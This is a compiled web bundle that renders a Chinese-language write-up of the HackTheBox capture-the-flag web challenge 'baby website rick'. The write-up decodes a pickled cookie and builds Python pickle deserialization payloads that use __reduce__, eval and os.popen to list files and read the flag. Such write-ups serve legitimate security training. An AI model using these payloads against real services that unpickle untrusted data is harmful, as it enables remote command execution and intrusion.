"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[77253],{8336:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>r,contentTitle:()=>p,default:()=>o,frontMatter:()=>i,metadata:()=>c,toc:()=>l});const c=JSON.parse('{"id":"HackTheBox/Challenges/Web/baby website rick/index","title":"baby website rick","description":"Difficulty: EASY","source":"@site/docs/HackTheBox/Challenges/Web/baby website rick/index.md","sourceDirName":"HackTheBox/Challenges/Web/baby website rick","slug":"/HackTheBox/Challenges/Web/baby website rick/","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Web/baby website rick/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Challenges/Web/baby website rick/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"baby todo or not todo","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Web/baby todo or not todo/"},"next":{"title":"looking glass","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Web/looking glass/"}}');var a=t(74848),s=t(28453);const i={},p="baby website rick",r={},l=[];function _(e){const n={admonition:"admonition",code:"code",h1:"h1",header:"header",img:"img",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"baby-website-rick",children:"baby website rick"})}),"\n",(0,a.jsxs)(n.admonition,{title:"CHALLENGE DESCRIPTION",type:"note",children:[(0,a.jsx)(n.p,{children:"Difficulty: EASY"}),(0,a.jsx)(n.p,{children:"Look Morty, look! I turned myself into a website Morty, I'm Website Rick babyyy!! But don't play around with some of them anti pickle serum I have stored somewhere safe, if I turn back to a human I'll have to go to family therapy and we don't want that Morty."}),(0,a.jsx)(n.p,{children:"\u770b\u554a\u83ab\u8482\uff0c\u5feb\u770b\uff01\u6211\u628a\u81ea\u5df1\u53d8\u6210\u7f51\u7ad9\u4e86\u83ab\u8482\uff0c\u6211\u662f\u7f51\u7ad9\u745e\u514b\u5b9d\u5b9d\u7248\uff01\uff01\u4e0d\u8fc7\u522b\u4e71\u52a8\u6211\u85cf\u5728\u67d0\u5904\u5b89\u5168\u4f4d\u7f6e\u7684\u90a3\u4e9b\u53cd\u6ce1\u83dc\u8840\u6e05\uff0c\u8981\u662f\u6211\u53d8\u56de\u4eba\u7c7b\u5c31\u5f97\u53c2\u52a0\u5bb6\u5ead\u5fc3\u7406\u6cbb\u7597\uff0c\u6211\u4eec\u53ef\u4e0d\u60f3\u90a3\u6837\u83ab\u8482\u3002"})]}),"\n",(0,a.jsx)(n.p,{children:"\u76f4\u63a5\u8bbf\u95ee\u670d\u52a1"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:t(74488).A+"",width:"2560",height:"1371"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"Don't play around with this serum morty!! <__main__.anti_pickle_serum object at 0x7f8b5b7ef7d0>\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u8fd9\u4e2a ",(0,a.jsx)(n.code,{children:"__main__.anti_pickle_serum"})," \u4e00\u770b\u5c31\u662f python \u7684\u5bf9\u8c61"]}),"\n",(0,a.jsx)(n.p,{children:"\u7ecf\u8fc7\u6392\u67e5\uff0c\u53d1\u73b0 Cookie \u5b58\u5728\u95ee\u9898"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:t(54007).A+"",width:"2560",height:"1359"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5bf9\u8fd9\u4e2a ",(0,a.jsx)(n.code,{children:"plan_b"})," \u8fdb\u884c\u5206\u6790\uff0c\u5f97\u5230"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:'>>> import base64\n>>> a1=base64.b64decode("KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu")\n>>> a1\nb"(dp0\\nS\'serum\'\\np1\\nccopy_reg\\n_reconstructor\\np2\\n(c__main__\\nanti_pickle_serum\\np3\\nc__builtin__\\nobject\\np4\\nNtp5\\nRp6\\ns."\n'})}),"\n",(0,a.jsxs)(n.p,{children:["\u4e0a ",(0,a.jsx)(n.code,{children:"pickletools"})," \u8fdb\u884c\u5206\u6790"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:'import base64\nimport pickle\nimport pickletools\n\ndata = "KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu"\ndata = base64.b64decode(data)\n\nprint(data)\n\n# \u53cd\u6c47\u7f16 pickle \u5b57\u8282\u7801\npickletools.dis(data)\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u5f97\u5230"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"b\"(dp0\\nS'serum'\\np1\\nccopy_reg\\n_reconstructor\\np2\\n(c__main__\\nanti_pickle_serum\\np3\\nc__builtin__\\nobject\\np4\\nNtp5\\nRp6\\ns.\"\n    0: (    MARK\n    1: d        DICT       (MARK at 0)\n    2: p    PUT        0\n    5: S    STRING     'serum'\n   14: p    PUT        1\n   17: c    GLOBAL     'copy_reg _reconstructor'\n   42: p    PUT        2\n   45: (    MARK\n   46: c        GLOBAL     '__main__ anti_pickle_serum'\n   74: p        PUT        3\n   77: c        GLOBAL     '__builtin__ object'\n   97: p        PUT        4\n  100: N        NONE\n  101: t        TUPLE      (MARK at 45)\n  102: p    PUT        5\n  105: R    REDUCE\n  106: p    PUT        6\n  109: s    SETITEM\n  110: .    STOP\nhighest protocol among opcodes = 0\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5c1d\u8bd5\u6267\u884c\uff0c\u4f1a\u53d1\u73b0\u5b58\u5728\u62a5\u9519"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:"import base64\nimport pickle\n\ndata = \"KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu\"\ndata = base64.b64decode(data)\n\na = pickle.loads(data)\n\n# Traceback (most recent call last):\n#   File \"d:\\_Code\\test\\test-9.py\", line 7, in <module>\n#     a = pickle.loads(data)\n#         ^^^^^^^^^^^^^^^^^^\n# AttributeError: Can't get attribute'anti_pickle_serum'on <module'__main__'from'd:\\\\_Code\\\\test\\\\test-9.py'>\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u6839\u636e\u62a5\u9519\u4fe1\u606f\uff0c\u6dfb\u52a0\u4e00\u4e2a ",(0,a.jsx)(n.code,{children:"anti_pickle_serum"})," \u53d8\u91cf"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:'import base64\nimport pickle\n\nanti_pickle_serum = ""\n\ndata = "KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu"\ndata = base64.b64decode(data)\n\na = pickle.loads(data)\n\n# Traceback (most recent call last):\n#   File "d:\\_Code\\test\\test-9.py", line 9, in <module>\n#     a = pickle.loads(data)\n#         ^^^^^^^^^^^^^^^^^^\n#   File "C:\\Users\\Randark\\AppData\\Local\\Programs\\Python\\Python311\\Lib\\copyreg.py", line 49, in _reconstructor\n#     obj = object.__new__(cls)\n#           ^^^^^^^^^^^^^^^^^^^\n# TypeError: object.__new__(X): X is not a type object (str)\n'})}),"\n",(0,a.jsxs)(n.p,{children:["\u6839\u636e\u62a5\u9519\u4fe1\u606f\uff0c\u53ef\u4ee5\u786e\u5b9a ",(0,a.jsx)(n.code,{children:"anti_pickle_serum"})," \u5e94\u8be5\u662f\u4e00\u4e2a\u7c7b"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:"import base64\nimport pickle\n\n\nclass anti_pickle_serum:\n    def __init__(self):\n        pass\n\n\ndata = \"KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu\"\ndata = base64.b64decode(data)\n\na = pickle.loads(data)\n\nprint(dir(a))\n\nprint(a)\n\n# ['__class__', '__class_getitem__', '__contains__', '__delattr__', '__delitem__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__ior__', '__iter__', '__le__', '__len__', '__lt__', '__ne__', '__new__', '__or__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__ror__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'clear', 'copy', 'fromkeys', 'get', 'items', 'keys', 'pop', 'popitem', 'setdefault', 'update', 'values']\n# {'serum': <__main__.anti_pickle_serum object at 0x000001E388AAF7D0>}\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u8fd9\u4e00\u6b21\u8fd0\u884c\u5c31\u6ca1\u6709\u95ee\u9898\u4e86\uff0c\u53ef\u4ee5\u5341\u5206\u786e\u5b9a\u662f pickle \u53cd\u5e8f\u5217\u5316\u5b9e\u73b0 RCE \u4e86\uff0c\u5e76\u4e14\u8fd9\u4e2a\u5e8f\u5217\u5316\u5bf9\u8c61\u4e3a\u4e00\u4e2a dict"}),"\n",(0,a.jsx)(n.p,{children:"\u5c1d\u8bd5 pickle \u5de5\u4f5c\u6d41\u7a0b"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:'from base64 import b64encode\nimport pickle\n\ndata = b64encode(pickle.dumps({"serum": "randark"}, protocol=0))\n\nprint(data)\n\n\n# KGRwMApWc2VydW0KcDEKVnJhbmRhcmsKcDIKcy4=\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u6210\u529f\u663e\u793a\u4e86\u6587\u672c"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:t(54947).A+"",width:"2560",height:"1233"})}),"\n",(0,a.jsx)(n.p,{children:"\u8fdb\u4e00\u6b65\u6d4b\u8bd5\uff0c\u5c1d\u8bd5\u547d\u4ee4\u6267\u884c"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:'from base64 import b64encode\nimport pickle\n\n\nclass anti_pickle_serum:\n    def __reduce__(self):\n        return (eval, ("7+7",))\n\n\npayload = b64encode(pickle.dumps({"serum": anti_pickle_serum()}, protocol=0))\n\nprint(payload)\n\n# KGRwMApWc2VydW0KcDEKY19fYnVpbHRpbl9fCmV2YWwKcDIKKFY3KzcKcDMKdHA0ClJwNQpzLg==\n'})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:t(55432).A+"",width:"2560",height:"1262"})}),"\n",(0,a.jsx)(n.p,{children:"\u90a3\u4e48\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u547d\u4ee4\u6267\u884c\u4e86"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:'from base64 import b64encode\nimport pickle\n\n\nclass anti_pickle_serum:\n    def __init__(self):\n        self.command = "ls"\n\n    def __reduce__(self):\n        return (eval, (f\'__import__("os").popen("{self.command}").read()\',))\n\n\npayload = b64encode(pickle.dumps({"serum": anti_pickle_serum()}, protocol=0))\n\nprint(payload)\n\n# KGRwMApWc2VydW0KcDEKY19fYnVpbHRpbl9fCmV2YWwKcDIKKFZfX2ltcG9ydF9fKCJvcyIpLnBvcGVuKCJscyIpLnJlYWQoKQpwMwp0cDQKUnA1CnMu\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u5f97\u5230"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:t(23194).A+"",width:"2560",height:"1263"})}),"\n",(0,a.jsx)(n.p,{children:"\u5df2\u7ecf\u770b\u5230 flag \u6587\u4ef6\u4e86\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u5230 flag \u6570\u636e\u4e86"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:'from base64 import b64encode\nimport pickle\n\n\nclass anti_pickle_serum:\n    def __init__(self):\n        self.command = "cat flag_wIp1b"\n\n    def __reduce__(self):\n        return (eval, (f\'__import__("os").popen("{self.command}").read()\',))\n\n\npayload = b64encode(pickle.dumps({"serum": anti_pickle_serum()}, protocol=0))\n\nprint(payload)\n\n# KGRwMApWc2VydW0KcDEKY19fYnVpbHRpbl9fCmV2YWwKcDIKKFZfX2ltcG9ydF9fKCJvcyIpLnBvcGVuKCJjYXQgZmxhZ193SXAxYiIpLnJlYWQoKQpwMwp0cDQKUnA1CnMu\n'})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:t(14424).A+"",width:"2560",height:"1291"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-flag",children:"HTB{g00d_j0b_m0rty...n0w_I_h4v3_to_g0_to_f4m1ly_th3r4py..}\n"})})]})}function o(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(_,{...e})}):_(e)}},54007:(e,n,t)=>{t.d(n,{A:()=>c});const c=t.p+"assets/images/image_20250304-190438-db8c9835d2e71d77abcb2a71c2aeeda6.png"},54947:(e,n,t)=>{t.d(n,{A:()=>c});const c=t.p+"assets/images/image_20250337-193741-c25b14ab10ff47e9b1eb093f5842956f.png"},55432:(e,n,t)=>{t.d(n,{A:()=>c});const c=t.p+"assets/images/image_20250340-194024-432aa8343dc6dd29b626ecdb791606ea.png"},23194:(e,n,t)=>{t.d(n,{A:()=>c});const c=t.p+"assets/images/image_20250343-194306-cca711055042113578f1b2183be678be.png"},14424:(e,n,t)=>{t.d(n,{A:()=>c});const c=t.p+"assets/images/image_20250344-194405-20a9d16ec2ebbf223da7f9473db5f044.png"},74488:(e,n,t)=>{t.d(n,{A:()=>c});const c=t.p+"assets/images/image_20250359-185907-2557d8554b657f05a8d2558d4efd8cb4.png"},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>p});var c=t(96540);const a={},s=c.createContext(a);function i(e){const n=c.useContext(s);return c.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function p(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),c.createElement(s.Provider,{value:n},e.children)}}}]);